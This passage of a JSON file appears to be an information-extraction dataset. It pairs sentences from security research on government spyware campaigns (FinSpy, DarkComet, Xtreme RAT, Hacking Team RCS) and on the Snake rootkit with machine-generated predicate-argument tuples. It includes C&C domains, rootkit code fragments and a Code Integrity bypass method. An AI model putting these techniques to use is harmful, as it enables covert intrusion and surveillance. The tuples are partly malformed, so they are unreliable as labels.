{"disguised": {"A": "disguised", "S": "an .scr file", "O": ["as a Word document"]}}], "\n   We found that FinSpy encrypts data using a custom imple-\nmentation of AES-256-CBC": [{"encrypts": {"A": "encrypts", "S": "FinSpy", "O": ["data", "using a custom imple- mentation of AES-256-CBC"]}}], " On\nthe one hand, we have observed attacks using a wide range of\noff-the-shelf spyware, as well as publicly available third-party\nservices, like iplogger.org": [{"using": {"A": "using", "S": "attacks", "O": ["a wide range of off-the-shelf spyware, as well as publicly available third-party services, like iplogger.org"]}}], "\n   The instance of Xtreme RAT sent to Author used\nowner.no-ip.biz for its C&C, one of the domains men-\ntioned in a report published by Norman about a year-long cam-\npaign of cyberattacks on Israeli and Palestinian targets carried\nout by a group that Norman was unable to identify <fn>[57]</fn> ": [{"used": {"A": "used", "S": "The instance of Xtreme RAT sent to Author", "O": ["for its C&C", "owner.no-ip.biz"]}}], " The\n    second involved specially crafted IP spy links and e-mails de-\n    signed to reveal the IP addresses of operators of pseudonymous\n    accounts": [{"reveal": {"A": "reveal", "S": "specially crafted IP spy links and e-mails", "O": ["the IP addresses of operators of pseudonymous accounts"]}}, {"involved": {"A": "involved", "S": "The second", "O": ["specially crafted IP spy links and e-mails"]}}], " Ahmed subsequently noted several suspicious ac-\ncesses to his GMail account using IMAP": [{"ac- cesses": {"A": "ac- cesses", "O": ["to his GMail account", "using IMAP"]}}], " We also found two groups\nthat forwarded to the same address": [{"forwarded": {"A": "forwarded", "S": "two groups", "O": ["to the same address"]}}], "\n   Use of embedded remote images: We identified several\ntargets who received spoofed e-mails containing embedded\nremote images": [{"received": {"A": "received", "S": "several targets", "O": ["spoofed e-mails containing embedded remote images"]}}], "\n   Gamma documentation advertises that an operator of FinSpy\ncan obscure the location of the C&C server (called the mas-\nter) by setting up a proxy known as a relay": [{"obscure": {"A": "obscure", "S": "an operator of FinSpy", "O": ["the location of the C&C server (called the mas- ter)", "by setting up a proxy known as a relay"]}}], "\n   Two weeks after this correspondence with Ahmed, one of us\n(Author in Figure 5) received a targeted e-mail with a link to\na file hosted on Google Docs containing a commercial off-the-\n\nshelf RAT, Xtreme RAT": [{"received": {"A": "received", "S": "one of us", "O": ["a targeted e-mail with a link to a file hosted on Google Docs containing a commercial off-the- shelf RAT, Xtreme RAT"]}}], " The document used the\n same exploit and attempted to download a second stage from\n rcs-demo.hackingteam.it, which was unavailable at\n the time of testing": [{"download": {"A": "download", "S": "The document", "O": ["from rcs-demo.hackingteam.it", "a second stage"]}}], " These attacks share the same\nC&C, 216.6.0.28, a Syrian IP address belonging to the Syr-\nian Telecommunications Establishment, and publicly reported\nas a C&C of Syrian malware since February 2012 <fn>[45]</fn> ": [{"share": {"A": "share", "S": "These attacks", "O": ["the same C&C, 216.6.0.28, a Syrian IP address belonging to the Syr- ian Telecommunications Establishment, and publicly reported as a C&C of Syrian malware since February 2012"]}}], "\n       The first involved malicious e-mails containing FinSpy, a\n    \u201clawful intercept\u201d trojan sold exclusively to governments": [{"involved": {"A": "involved", "S": "The first", "O": ["malicious e-mails containing FinSpy, a \u201clawful intercept\u201d trojan sold exclusively to governments"]}}], " Even after he changed\nhis password, the accesses continued": [{"continued": {"A": "continued", "S": "the accesses", "O": ["Even after he changed his password"]}}], "\n       The other .rar files contained a Word document with an\n    embedded ASCII-encoded PE file containing a custom macro\n    set to automatically run upon document startup": [{"automatically run": {"A": "automatically run", "S": "a custom macro set", "O": ["upon document startup"]}}, {"contained": {"A": "contained", "S": "The other .rar files", "O": ["a Word document with an embedded ASCII-encoded PE file"]}}], "\n    The attacks, while sometimes incorporating effective so-\ncial engineering, in general lack novel technical elements": [{"incorporating": {"A": "incorporating", "S": "The attacks", "O": ["effective so- cial engineering"]}}], " .\u201d The page redirected to a YouTube\nvideo a few seconds later, but first loaded a Java exploit <fn>[64]</fn> \u2014a\n\n<footer>USENIX Association \t                                                                                 23rd USENIX Security Symposium\u2003 519</footer>\n\fknown vulnerability with no patch at the time that the e-mails\nwere sent": [{"loaded": {"A": "loaded", "S": "The page", "O": ["a Java exploit"]}}], "\n</footnote>\nrevolved around Tweets that referred to Bahrain\u2019s King as a\n\u201ccursed one.\u201d Red Sky had earlier targeted other users with IP\nspy links shortened using the al9mood bit.ly account": [{"targeted": {"A": "targeted", "S": "Red Sky", "O": ["other users", "with IP spy links shortened using the al9mood bit.ly account"]}}], " We located a version of FinSpy that does not\nuse the normal FinSpy handshake, but instead uses a protocol\nbased on HTTP POST requests for communication with the\nC&C server": [{"uses": {"A": "uses", "S": "a version of FinSpy", "O": ["a protocol based on HTTP POST requests", "for communication with the C&C server"]}}], " The attack downloaded an instance of\nSpyNet from isteeler.com (which from our inspection did\nnot appear to have any legitimate content), which used the\nC&C storge.myftp.org": [{"used": {"A": "used", "S": "an instance of SpyNet", "O": ["the C&C storge.myftp.org"]}}, {"downloaded": {"A": "downloaded", "S": "The attack", "O": ["from isteeler.com", "an instance of SpyNet"]}}], " @YLUBH received at\nleast three IP spy links in late 2012, sent via public Twitter mes\nsages": [{"received": {"A": "received", "S": "@YLUBH", "O": ["in late 2012", "at least three IP spy links"]}}], " The spyware period-\nically probes this folder for files that match a certain naming\nconvention, then sends them to the C&C server": [{"probes": {"A": "probes", "S": "The spyware", "O": ["this folder", "for files that match a certain naming convention"]}, "sends": {"A": "sends", "S": "The spyware", "O": ["them", "to the C&C server"]}}], " The .scr file was a self-extracting\narchive that decompressed and ran both the bait document\nand the payload": [{"ran": {"A": "ran", "S": "The .scr file", "O": ["both the bait document and the payload"]}}], " While dis-\ntracted by this meaningless interaction, the victim\u2019s machine is\ninfected with DarkComet 3.3 [<fn>32</fn>, <fn>33</fn>] ": [{"is infected": {"A": "is infected", "O": ["the victim\u2019s machine", "with DarkComet 3.3", "While dis- tracted by this meaningless interaction"]}}], " The\nfirst bait file presents to the victim as a PDF containing infor-\nmation about a planned uprising in Aleppo": [{"presents": {"A": "presents", "S": "The first bait file", "O": ["to the victim", "as a PDF containing infor- mation about a planned uprising in Aleppo"]}}], "\n    For seeding, the attackers typically use compromised ac-\ncounts (including those of arrested individuals) or fake iden-\ntities masquerading as pro-opposition": [{"use": {"A": "use", "S": "the attackers", "O": ["compromised ac- counts (including those of arrested individuals) or fake iden- tities masquerading as pro-opposition", "For seeding"]}}], " Attackers often used (1) accounts of promi-\nnent or trusted but jailed individuals like \u201cRed Sky,\u201d (2) fake\npersonas (e.g., attractive women or fake job seekers when tar-\ngeting a labor union), or (3) impersonations of legitimate ac-\ncounts": [{"used": {"A": "used", "S": "Attackers", "O": ["(1) accounts of promi- nent or trusted but jailed individuals like \u201cRed Sky,\u201d (2) fake personas (e.g., attractive women or fake job seekers when tar- geting a labor union), or (3) impersonations of legitimate ac- counts"]}}], " This sample of SpyNet\ncommunicated with the same C&C hamas.sytes.net": [{"communicated": {"A": "communicated", "S": "This sample of SpyNet", "O": ["with the same C&C hamas.sytes.net"]}}], " In all, these totaled 17 distinct\nhashes of documents, and 10 distinct hashes of payloads (some\ndocuments that differed in their hash downloaded the same pay-\nload)": [{"downloaded": {"A": "downloaded", "S": "some documents that differed in their hash", "O": ["the same pay- load"]}}], "\nThe exploit loaded shellcode that downloaded a second stage\n<figure>\n         UAE Gov't         HackingTeam            3-Stage\n                                               Exploit Kit\n                                                                 owner.no-ip.biz\n                   CVE-2010-3333\n                                         \u201cwikileaks\u201d         Xtreme RAT\n                   RCS                 \u201cveryimportant\u201d\n                                 Author\n          ar-24.com                                Communicated\n                                                     via E-Mail\n         Ahmed\n                       Laptop\n                      infected\n                                        E-Mail account\n                                        compromised\n                                        </figure>\n                                        <caption>\n Figure 5: Part of the ecosystem of UAE surveillance at-\n tacks.</caption>\n from ar-24.com, which in turn downloaded spyware from\n ar-24.com": [{"downloaded": {"A": "downloaded", "S": "a second stage", "O": ["spyware", "from ar-24.com"]}}, {"loaded": {"A": "loaded", "S": "The exploit", "O": ["shellcode"]}}, {"downloaded": {"A": "downloaded", "S": "shellcode", "O": ["a second stage", "from ar-24.com"]}}], "\n    The C&C server also ran on ar-24.com": [{"ran": {"A": "ran", "S": "The C&C server", "O": ["on ar-24.com"]}}], " In fact the file is a\nWindows Screensaver (.scr) that masquerades as a PDF using\nUnicode RLO, rendering a name such as \u201c.fdp.scr\u201d dis-\nplay to the victim as \u201c.rcs.pdf.\u201d The second bait file is\na dummy program containing DarkComet while masquerading\nas a Skype call encryption program, playing to opposition para-\nnoia about government backdoors in common software": [{"masquerades": {"A": "masquerades", "S": "the file", "O": ["as a PDF", "using Unicode RLO"]}}, {"masquerading": {"A": "masquerading", "S": "The second bait file", "O": ["as a Skype call encryption program"]}}], " Yet, the attacks are\nnoteworthy for their careful social engineering, their links to\ngovernments, and their real-world impact": [{"careful social engineering": {"A": "careful social engineering", "S": "the attacks"}}], " The SpyNet sample communicated\nwith the C&C hamas.sytes.net": [{"communicated": {"A": "communicated", "S": "The SpyNet sample", "O": ["with the C&C hamas.sytes.net"]}}], " These techniques often limit\nthe world-visibility of malicious files and links, slowing their\ndetection by common AV products": [{"slowing": {"A": "slowing", "S": "These techniques", "O": ["their detection by common AV products"]}}], " We also saw instances\n of the 3-Stage Exploit Kit where the first stage contained a\n Flash exploit; in some cases, we could obtain all stages and\n confirm that these installed RCS": [{"installed": {"A": "installed", "S": "these", "O": ["RCS"]}}], " Two RCS and 5 FSBSpy samples from VirusTo-\ntal communicated with various servers in the group": [{"communicated": {"A": "communicated", "S": "Two RCS and 5 FSBSpy samples from VirusTo- tal", "O": ["with various servers in the group"]}}], " In general, the attacks we find are not well-\ndetected by anti-virus programs": [{"are not well- detected": {"A": "are not well- detected", "O": ["the attacks", "by anti-virus programs"]}}], " Both attacks resulted in an Xtreme RAT infection": [{"resulted": {"A": "resulted", "S": "Both attacks", "O": ["in an Xtreme RAT infection"]}}], " We then infected the\nVM with FinSpy and allowed it to connect to the Bahrain C&C\nserver": [{"connect": {"A": "connect", "S": "it", "O": ["to the Bahrain C&C server"]}}], "\n   Two of the other CVE-2012-0158 exploits down-\nloaded DarkComet from www.getmedia.us and\nwww.technopenta.com after posting system infor-\nmation to random123.site11.com": [{"posting": {"A": "posting", "S": "Two of the other CVE-2012-0158 exploits", "O": ["system infor- mation", "to random123.site11.com"]}, "down- loaded": {"A": "down- loaded", "S": "Two of the other CVE-2012-0158 exploits", "O": ["DarkComet", "from www.getmedia.us and www.technopenta.com"]}}], " On the other hand, some at-\ntacks use so-called \u201clawful intercept\u201d trojans and related equip-\n<footnote>\n   1 Dates   in the paper are given MM/DD/YY": [{"use": {"A": "use", "S": "some at- tacks", "O": ["so-called \u201clawful intercept\u201d trojans"]}}], "\nThis executable contained a similar string, except it identi-\nfied itself as FinSpy v3.00, and attempted to connect to\ntiger.gamma-international.de, a domain registered\nto Gamma International GmbH": [{"connect": {"A": "connect", "S": "This executable", "O": ["to tiger.gamma-international.de, a domain registered to Gamma International GmbH"]}}], " While corresponding\nwith Ahmed on his compromised account, an author of this pa-\nper discovered that the attackers had installed an application-\nspecific password <fn>[56]</fn>  in Ahmed\u2019s GMail account, a secondary\n\npassword that they apparently used to access his account even\nafter he changed his main password": [{"used": {"A": "used", "S": "they", "O": ["to access his account", "even after he changed his main password", "a secondary password"]}}], " In some cases the attackers employed\nexpensive and \u201cgovernment exclusive\u201d malware, while in other\ncases, attackers used cheap and readily available RATs": [{"used": {"A": "used", "S": "attackers", "O": ["cheap and readily available RATs"]}}, {"employed": {"A": "employed", "S": "the attackers", "O": ["expensive and \u201cgovernment exclusive\u201d malware"]}}], " These individuals received e-mails containing a\nlink to a web page hosted on cedarkeyrv.com impersonat-\ning YouTube": [{"received": {"A": "received", "S": "These individuals", "O": ["e-mails containing a link to a web page hosted on cedarkeyrv.com impersonat- ing YouTube"]}}], " We located additional samples (see\n \u00a7 5), some of which were embedded in a .jar file that installs\n an OS-appropriate version of RCS (Windows or OSX), option-\n ally using an exploit": [{"installs": {"A": "installs", "S": "a .jar file", "O": ["an OS-appropriate version of RCS"]}}], "\n    The first attacks in Figure 3 date to 2012, and use bait files\nwith a DarkComet RAT payload": [{"use": {"A": "use", "S": "The first attacks", "O": ["bait files with a DarkComet RAT payload"]}}], "\n</section><section>\n<heading>IP spy Campaign.</heading> In an IP spy attack, the attacker aims to\ndiscover the IP address of a victim who is typically the opera-\ntor of a pseudonymous social media or e-mail account": [{"discover": {"A": "discover", "S": "the attacker", "O": ["the IP address of a victim who is typically the opera- tor of a pseudonymous social media or e-mail account"]}}], " Member C and NGO Worker\nD (here, actual victims, not abstract), targeting was by e-mail\nfrom domains apparently belonging to opposition groups, in-\ndicating a potential compromise": [{"targeting": {"A": "targeting", "O": ["by e-mail from domains apparently belonging to opposition groups, in- dicating a potential compromise"]}}], "        We found that some\n    of the attachments contained a PE (.exe) file designed to\n    appear as an image": [{"contained": {"A": "contained", "S": "some of the attachments", "O": ["a PE (.exe) file designed to appear as an image"]}}], " Across\nthese cases we find that clever social engineering often plays\na central role, which is strong evidence of a well-informed ad-\nversary": [{"plays": {"A": "plays", "S": "clever social engineering", "O": ["a central role"]}}], " One difference was in the vectors\n used to install the spyware": [{"install": {"A": "install", "S": "the vectors", "O": ["the spyware"]}}], " Typically, targets receive\neither (1) a PE in a .zip or .rar, (2) a file download link, or\n(3) a link that will trigger a drive-by download": [{"receive": {"A": "receive", "S": "targets", "O": ["either (1) a PE in a .zip or .rar, (2) a file download link, or (3) a link that will trigger a drive-by download"]}}], " This domain was also\nused for C&C in other attacks, including that on Journalist C": [{"was also used": {"A": "was also used", "O": ["This domain", "for C&C in other attacks"]}}], "\n\nThe analysed code suggests that even file system and registry operations can be delegated by an infected module to another\nmodule in order to stay unnoticed by behaviour analysis engines of the antivirus products, and to overcome account restrictions of\nthe browser processes so that the injected module could still write into files and into the sensitive registry hives": [{"stay": {"A": "stay", "O": ["unnoticed", "by behaviour analysis engines of the antivirus products"]}}, {"overcome": {"A": "overcome", "O": ["account restrictions of the browser processes"]}}, {"write": {"A": "write", "S": "the injected module", "O": ["into files", "into the sensitive registry hives"]}}], "\n\nAnalysis of the commands performed by the malware suggests the following capabilities:\n<list>\n    \u2022\t   Scan the network for the presence of other hosts (maximum 1 hour is allocated for this task)\n    \u2022\t   Set maximum upload file size\n    \u2022\t   Go \u2018stealth\u2019 mode for the specified number of days - Snake will not initiate any connections during that time\n    \u2022\t   Run specified shell commands and collect the output logs for further delivery\n    \u2022\t   Modify settings stored with the registry key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellCore\n    \u2022\t   Search for files\n    \u2022\t   Upload specified files\n    \u2022\t   Add new C&C domains\n    \u2022\t   Update the driver with a new version\n    \u2022\t   Download files\n    \u2022\t   Run specified executable files\n    \u2022\t   Set self-deactivation timeout\n    \u2022\t   If the virtual partition \\\\.\\vd1 exists, copy all Snake logs into that partition\n</list>\nTogether, these commands provide complete backdoor functionality, allowing remote attacker full control over the compromised\nsystem": [{"provide": {"A": "provide", "S": "these commands", "O": ["complete backdoor functionality"]}, "allowing": {"A": "allowing", "S": "these commands", "O": ["full control over the compromised system", "remote attacker"]}}, {"performed": {"A": "performed", "S": "the malware", "O": ["the commands"]}}], "\n\nThe driver inspects bidirectional network data on a per stream basis, as it\u2019s located right on the stream data path": [{"inspects": {"A": "inspects", "S": "The driver", "O": ["bidirectional network data", "on a per stream basis"]}}], " a browser), it will inject malicious DLL module\n         into it; depending on the operational mode, the DLL may start communicating with C&C directly": [{"start": {"A": "start", "S": "the DLL", "O": ["communicating with C&C directly"]}}, {"inject": {"A": "inject", "S": "it", "O": ["malicious DLL module", "into it"]}}], " In this case, in order to ensure the driver is loaded automatically at startup, the dropper can install the 64-bit\ndriver on 64-bit Windows XP in the same way it installs a 32-bit driver on a 32-bit version of Windows XP": [{"installs": {"A": "installs", "S": "it", "O": ["a 32-bit driver", "on a 32-bit version of Windows XP"]}}, {"ensure": {"A": "ensure", "S": "the dropper", "O": ["the driver is loaded automatically at startup"]}, "install": {"A": "install", "S": "the dropper", "O": ["the 64-bit driver", "on 64-bit Windows XP"]}}], "\n\nIn order to log its activity, the driver writes log data into the pipe \\Device\\NamedPipe\\isapi_log, so that the DLL could log the\ndata into the log files": [{"log": {"A": "log", "S": "the driver", "O": ["its activity"]}, "writes": {"A": "writes", "S": "the driver", "O": ["log data", "into the pipe \\Device\\NamedPipe\\isapi_log"]}}, {"log": {"A": "log", "S": "the DLL", "O": ["into the log files", "the data"]}}], "\n\n Static analysis of the code reveals that the Snake driver uses virtual volumes to store its data and additional files on it": [{"store": {"A": "store", "S": "the Snake driver", "O": ["on it", "its data and additional files"]}, "uses": {"A": "uses", "S": "the Snake driver", "O": ["virtual volumes"]}}], " An ability to\nmanipulate data streams is provided with the packet injection logic below, allowing Snake to covertly insert traffic destined to its\nC&C servers:\n<code>\n      01    int __stdcall stream_inject(int flowHandle, int calloutId, int layerId)\n      02    {\n      03        int iRet = 0;\n      04        int ntStatus = FwpsAllocateNetBufferAndNetBufferList(m_hNdisNblPool, 0, 0, 0, 0, &iRet);\n      05        if (!ntStatus)\n      06        {\n      07            ntStatus = _FwpsStreamInjectAsync(m_hInjection,\n      08                                               0,\n      09                                               0,\n      10                                               flowHandle,\n      11                                               calloutId,\n      12                                               layerId,\n      13                                               20,\n      14                                               3,\n      15                                               iRet,\n      16                                               0,\n      17                                               sStreamInjectCompletion,\n      18                                               0);\n      19        if (!ntStatus)\n      20        {\n      21            iRet = 0;\n      22        }\n      23        if (iRet)\n      24        {\n      25           FwpsFreeNetBufferList(iRet);\n      26        }\n      27        return ntStatus;\n      28    }\n</code>\n\n<footer>                                                        BAE Systems Applied Intelligence: Snake Rootkit Report 2014           15</footer>\n\fIn order to qualify as a browser, the usermode process must have any of the following names:\n<code>\n        01    bool isBrowserProcess(const wchar_t *szProcName)\n        02    {\n        03        return !wcsicmp(szProcName, L\u201diexplore.exe\u201d) ||\n        04               !wcsicmp(szProcName, L\u201dfirefox.exe\u201d) ||\n        05               !wcsicmp(szProcName, L\u201dopera.exe\u201d) ||\n        06               !wcsicmp(szProcName, L\u201dnetscape.exe\u201d) ||\n        07               !wcsicmp(szProcName, L\u201dmozilla.exe\u201d) ||\n        08               !wcsicmp(szProcName, L\u201dchrome.exe\u201d);\n        09    }\n</code>\n</section>\n<section>\n<heading>\n\n\n\nTDI FILTER DRIVER</heading>\nIn addition to WFP, Snake also hooks the Transport Driver Interface (TDI) network routines by setting itself up as a TDI filter driver": [{"insert": {"A": "insert", "S": "Snake", "O": ["traffic destined to its C&C servers"]}, "manipulate": {"A": "manipulate", "S": "Snake", "O": ["data streams"]}}, {"hooks": {"A": "hooks", "S": "Snake", "O": ["by setting itself up as a TDI filter driver", "the Transport Driver Interface (TDI) network routines"]}}], "\nNext, it fetches a file /D/pub.txt, and expects the server to respond with a string \u201c1\u201d, acknowledging it\u2019s active:\n<list>\n      03:52:06 1336: Connect swim.onlinewebshop.net                    type(0)..": [{"fetches": {"A": "fetches", "S": "it", "O": ["a file /D/pub.txt"]}, "expects": {"A": "expects", "S": "it", "O": ["the server to respond with a string \u201c1\u201d, acknowledging it\u2019s active"]}}], " If such a driver is installed via an update, the usermode component can be instructed to delegate the file upload\ntask to the driver by copying all the necessary logs into the shared virtual partition, physically located on the compromised host and\nthus, accessible from kernel": [{"is installed": {"A": "is installed", "O": ["such a driver", "via an update"]}}, {"copying": {"A": "copying", "O": ["into the shared virtual partition", "all the necessary logs"]}}, {"be instructed": {"A": "be instructed", "O": ["the usermode component"]}}], " They use highly sophisticated\nmalware tools to maintain persistent access to their targets": [{"maintain": {"A": "maintain", "S": "They", "O": ["persistent access to their targets"]}}], "\n\n<footer>                                                            BAE Systems Applied Intelligence: Snake Rootkit Report 2014           16</footer>\n\fAfter that, the drivers hooks the following exports within ndis.sys (for NDIS 6.0):\n<list>\n    \u2022\t NdisFRegisterFilterDriver\n    \u2022\t NdisFDeregisterFilterDriver\n    \u2022\t NdisSetOptionalHandlers\n    \u2022\t NdisFSetAttributes\n</list>\nAnother set of exports it attempts to hook in ndis.sys (for NDIS 6.0) is:\n<list>\n    \u2022\t NdisMRegisterMiniportDriver\n    \u2022\t NdisMDeregisterMiniportDriver\n    \u2022\t NdisMIndicateReceiveNetBufferLists\n    \u2022\t NdisMRestartComplete\n    \u2022\t NdisMPauseComplete\n</list>\nWith the hooks installed, whenever the network adapter driver attempts to register to NDIS, or whenever there is an attempt to\ninstall NDIS intermediate driver or NDIS filter driver, the hook handlers will register Snake\u2019s own MiniportXxx functions with the NDIS\nlibrary": [{"register": {"A": "register", "S": "the hook handlers", "O": ["Snake\u2019s own MiniportXxx functions", "with the NDIS library"]}}, {"hooks": {"A": "hooks", "S": "the drivers", "O": ["the following exports", "within ndis.sys (for NDIS 6.0)"]}}, {"hook": {"A": "hook", "S": "it", "O": ["Another set of exports", "in ndis.sys (for NDIS 6.0)"]}}, {"installed": {"A": "installed", "O": ["the hooks"]}}], "\n\nAfter that, the drivers hooks the following exports within ndis.sys:\n<list>\n    \u2022\t NdisIMRegisterLayeredMiniport\n    \u2022\t NdisTerminateWrapper\n</list>\nThe rootkit contains code that installs NDIS filter driver for NDIS 6.0 and above:\n<list>\n    Unique name: {c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\n    User-readable description: filter_c06b1a3b\n</list>\nNDIS filter driver configuration is stored in the registry entry:\n<list>\n    HKLM\\SYSTEM\\CurrentControlSet\\Control\\Network\\{4d36e974-e325-11ce-bfc1-08002be10318}\n</list>\nThe driver is registered with NdisFRegisterFilterDriver() API": [{"is registered": {"A": "is registered", "O": ["with NdisFRegisterFilterDriver() API", "The driver"]}}, {"installs": {"A": "installs", "S": "code", "O": ["NDIS filter driver for NDIS 6.0 and above"]}}, {"hooks": {"A": "hooks", "S": "the drivers", "O": ["within ndis.sys", "the following exports"]}}, {"is stored": {"A": "is stored", "O": ["in the registry entry", "NDIS filter driver configuration"]}}], " OK\n      03:52:11 1404: GET /D/77568289\n      03:52:12 1404: Http status: 200\n      03:52:12 1404: Command for all\n      03:52:12 1404: recv 346/346\n      03:52:12 Command Id:303149772662877808(130201837456870000)[13:42:25 05/08/2013]\n</list>\n\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014        9</footer>\n\n\n\fThe command it receives from C&C above (swim.onlinewebshop.net) is encrypted": [{"is encrypted": {"A": "is encrypted", "O": ["The command"]}, "receives": {"A": "receives", "S": "it", "O": ["from C&C", "The command"]}}], "\n\nInfection starts from a dropper penetrating into the compromised system where it is allowed to run": [{"starts": {"A": "starts", "S": "Infection", "O": ["from a dropper penetrating into the compromised system where it is allowed to run"]}}], "\n\n\nBeing registered as a TDI driver on the device stack, Snake hooks TCP calls": [{"registered": {"A": "registered", "S": "Snake", "O": ["as a TDI driver", "on the device stack"]}, "hooks": {"A": "hooks", "S": "Snake", "O": ["TCP calls"]}}], "\n    36             }\n    37         }\n    38     }\n</code>\n\nNow that the vulnerable driver can be used as a weapon to patch kernel memory, all the malware needs to do is to patch the content\nof the variable nt!g_CiEnabled, a boolean variable \u201cCode Integrity Enabled\u201d that marks whether the system was booted in\nWinPE mode": [{"be used": {"A": "be used", "O": ["the vulnerable driver", "as a weapon to patch kernel memory"]}}], "\n\nThe authentication is implemented by decrypting the data and making sure it starts with the markers 0xDEADBEAF and\n0xC001BA5E (which appear to derive from \u2018DEAD BEEF\u2019 and \u2018COOL BASE\u2019)": [{"making sure": {"A": "making sure", "O": ["it starts with the markers 0xDEADBEAF and 0xC001BA5E (which appear to derive from \u2018DEAD BEEF\u2019 and \u2018COOL BASE\u2019)"]}}, {"is implemented": {"A": "is implemented", "O": ["The authentication"]}}, {"decrypting": {"A": "decrypting", "O": ["the data"]}}], "\n\nThe ObOpenObjectByName() hook is designed to hide the presence of its virtual partitions (described later)": [{"hide": {"A": "hide", "S": "The ObOpenObjectByName() hook", "O": ["the presence of its virtual partitions"]}}], " Another reason is to overcome account restrictions imposed on a browser process in order to be able to write into files/\nregistry": [{"write": {"A": "write", "O": ["into registry"]}}, {"write": {"A": "write", "O": ["into files"]}}, {"overcome": {"A": "overcome", "O": ["account restrictions imposed on a browser process"]}}], "\n\nFor example, on HTTP traffic arrival it may send traffic data into a memory pipe \\Device\\NamedPipe\\isapi_http, and then,\nsend a received peer-2-peer command message write_peer_nfo=[IP_ADDRESS:PORT]0frag_no_scrambling=Y0 into\nanother memory pipe called \\Device\\NamedPipe\\isapi_dg": [{"send": {"A": "send", "S": "it", "O": ["traffic data", "into a memory pipe \\Device\\NamedPipe\\isapi_http"]}}], "\n\nWith this architecture, the Snake driver is mainly used to load the DLL module into the usermode processes, and then use that\nmodule for the communications": [{"load": {"A": "load", "S": "the Snake driver", "O": ["the DLL module", "into the usermode processes"]}, "use": {"A": "use", "S": "the Snake driver", "O": ["for the communications", "that module"]}}], " The encryption algorithm is based on CAST-128, with the hard-coded key stored in the rootkit\nbody": [{"is based": {"A": "is based", "O": ["on CAST-128", "The encryption algorithm"]}}, {}], " It carries a list of interface identifiers associated with\nthe named pipes": [{"associated": {"A": "associated", "O": ["a list of interface identifiers", "with the named pipes"]}}], " If so, it considers\nit to be a system shutdown, so it unloads its usermode DLL and deactivates its own network drivers, just like it does when its\nZwShutdownSystem() hook handler gets invoked": [{"unloads": {"A": "unloads", "S": "it", "O": ["its usermode DLL"]}, "deactivates": {"A": "deactivates", "S": "it", "O": ["its own network drivers"]}}], "\n\nBoth volumes appear to be set up as FAT volumes": [{"be set up": {"A": "be set up", "O": ["Both volumes", "as FAT volumes"]}}], "\n\n</section>\n\n\n <footer>                                                          BAE Systems Applied Intelligence: Snake Rootkit Report 2014             19</footer>\n\n\f\n <section>\n <heading>VIRTUAL FILE VOLUMES</heading>\nThe driver creates virtual file volumes for encrypted storage of its files and configuration data:\n<list>\n    \u2022\t \\\\.\\Hd1\n    \u2022\t \\\\.\\Hd2\n</list>\nThe volumes are mounted from the virtual file systems RawDisk1 and RawDisk2": [{"are mounted": {"A": "are mounted", "O": ["The volumes", "from the virtual file systems RawDisk1 and RawDisk2"]}}, {"creates": {"A": "creates", "S": "The driver", "O": ["virtual file volumes", "for encrypted storage of its files and configuration data"]}}], "\nTo send the data back, the protocol driver defines the data\nin a list of NET_BUFFER_LIST structures, and then passes\nthem to NDIS by calling NdisSendNetBufferLists()": [{"defines": {"A": "defines", "S": "the protocol driver", "O": ["the data", "in a list of NET_BUFFER_LIST structures"]}, "calling": {"A": "calling", "S": "the protocol driver", "O": ["NdisSendNetBufferLists()"]}}, {"send": {"A": "send", "O": ["the data"]}}], "\n\n For example, it stores its message queue in a file called:\n<list>\n \\.\\\\Hd1\\queue\n</list>\n The message queue indicates an asynchronous communication model between kernel mode driver and a usermode DLL,\n e.g": [{"stores": {"A": "stores", "S": "it", "O": ["its message queue", "in a file called"]}}], "\n\nDepending on the variant, the DLL is dropped either under a random name or a hard-coded name, such as mscpx32n.dll": [{"is dropped": {"A": "is dropped", "O": ["the DLL", "under a random name or a hard-coded name"]}}], "\n\nBeing able to fully manipulate traffic at 3 different levels (NDIS protocol driver, TDI Driver, and WPF callout driver), Snake is able to\n\u2018inject\u2019 the traffic into existing communications to reach out to external components, and at the same time parse all incoming traffic\nto detect traffic addressed to itself:\n<figure>\n                                                                                       Infected User        Injected\n                                    Traffic Interception                                 Application        Module\n                                0xDEADBEAF/0xC001BA5E\n                                           Checks\n                                                    WFP           TDI          NDIS\n                  Internet                                                                                        Memory\n                                                                                                                   pipes\n                                      Traffic\n                                    Injection\n\n\n                                                                        Snake\u2019s Kernel Mode Driver\n</figure>\n\n</section>\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014           17</footer>\n\n\f\n<section>\n<heading>DEAD BEEF ON A COOL BASE</heading>\nAs the driver intercepts all connections (e.g": [{"parse": {"A": "parse", "S": "Snake", "O": ["all incoming traffic"]}, "reach out": {"A": "reach out", "S": "Snake", "O": ["to external components"]}, "detect": {"A": "detect", "S": "Snake", "O": ["traffic addressed to itself"]}, "manipulate": {"A": "manipulate", "S": "Snake", "O": ["at 3 different levels (NDIS protocol driver, TDI Driver, and WPF callout driver)", "traffic"]}, "\u2018inject\u2019": {"A": "\u2018inject\u2019", "S": "Snake", "O": ["into existing communications", "the traffic"]}}, {"intercepts": {"A": "intercepts", "S": "the driver", "O": ["all connections"]}}], "\nThis explains why Snake dropper registers itself as a service to start each time Windows starts: in order to install the vulnerable\nVBox driver first, then pass it a malformed structure to disable Code Integrity control with a DeviceIoControl() API call, and\nfinally, load the driver": [{"install": {"A": "install", "S": "Snake dropper", "O": ["the vulnerable VBox driver"]}, "start": {"A": "start", "S": "Snake dropper", "O": ["each time Windows starts"]}, "disable": {"A": "disable", "S": "Snake dropper", "O": ["with a DeviceIoControl() API call", "Code Integrity control"]}, "registers": {"A": "registers", "S": "Snake dropper", "O": ["as a service", "itself"]}, "load": {"A": "load", "S": "Snake dropper", "O": ["the driver"]}}], " It attempts to do this by\nrunning MS09-025 and MS10-015 exploits on the target system": [{"running": {"A": "running", "S": "It", "O": ["on the target system", "MS09-025 and MS10-015 exploits"]}}], "\n\nThe presence of the reconnaissance tool in the Snake operators\u2019 framework suggests the existence of an arsenal of infiltration\ntools, designed to compromise a system, then find a way to replicate into other hosts, infect them, and spread the infection\neven further": [{"suggests": {"A": "suggests", "S": "The presence of the reconnaissance tool in the Snake operators\u2019 framework", "O": ["the existence of an arsenal of infiltration tools"]}}, {"spread": {"A": "spread", "O": ["the infection", "even further"]}}, {"compromise": {"A": "compromise", "S": "the existence of an arsenal of infiltration tools", "O": ["a system"]}}, {"replicate": {"A": "replicate", "O": ["into other hosts"]}}, {"infect": {"A": "infect", "O": ["them"]}}], " A great deal of attention has also\nbeen given to keep its network 